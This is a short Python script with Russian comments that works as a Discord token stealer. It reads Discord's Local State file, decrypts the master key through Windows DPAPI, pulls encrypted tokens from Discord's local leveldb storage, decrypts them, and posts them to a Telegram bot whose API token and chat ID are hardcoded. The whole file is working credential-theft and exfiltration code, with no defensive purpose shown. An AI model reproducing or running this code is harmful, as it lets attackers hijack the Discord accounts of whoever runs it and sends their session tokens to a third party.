import os
import json
import base64
import re
from Crypto.Cipher import AES
import win32crypt # Если выдаст ошибку, напишите в консоли: pip install pywin32 pycryptodome
import requests

def get_master_key():
    path = os.getenv('APPDATA') + r'\discord\Local State'
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # Убираем префикс DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_token(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

master_key = get_master_key()
path = os.getenv('APPDATA') + r'\discord\Local Storage\leveldb'

tokens =[]

for file_name in os.listdir(path):
    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
        continue
    with open(f'{path}\\{file_name}', errors='ignore') as f:
        for line in f.readlines():
            for token in re.findall(r'dQw4w9WgXcQ:[^.*\x22]*', line):
                token = token.split('dQw4w9WgXcQ:')[1]
                decrypted_token = decrypt_token(base64.b64decode(token), master_key)
                tokens.append(decrypted_token)
                print(f"Ваш токен: {decrypted_token}")

def send_to_telegram(token_discord):
    # Данные твоего бота
    api_token = '7961232956:AAF2vHYgMAhEejXm4azR08okk6RvjdNvz5U'
    chat_id = '1226217069'
    
    url = f"https://api.telegram.org/bot{api_token}/sendMessage"
    payload = {
        "chat_id": chat_id, 
        "text": f"🚀Токен: {token_discord}"
    }
    
    try:
        # Важно: используем json=payload для правильной передачи данных
        response = requests.post(url, json=payload)
        print(f"Статус: {response.status_code}")
        print(f"Ответ: {response.text}")
    except Exception as e:
        print(f"Ошибка сети: {e}")

# ВЫЗОВ ФУНКЦИИ (без этой строки ничего не произойдет!)
send_to_telegram(tokens)